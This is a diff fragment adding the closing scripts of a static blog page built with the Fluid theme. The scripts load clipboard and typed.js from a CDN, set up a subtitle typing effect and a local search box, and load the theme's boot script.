+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
